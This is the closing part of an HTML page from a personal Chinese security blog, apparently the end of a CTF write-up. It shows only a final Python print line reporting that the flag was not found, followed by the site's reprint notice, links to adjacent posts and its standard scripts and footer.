        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] flag 未找到"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lingqing777.github.io/2025/07/20/20125/">https://lingqing777.github.io/2025/07/20/20125/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                                <a href="/tags/wp/">
                                    <span class="chip bg-color">wp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/07/20/2025/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="r3tf">
                        
                        <span class="card-title">r3tf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-07-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/07/16/hello-world/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Hello World">
                        
                        <span class="card-title">Hello World</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">130.5k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
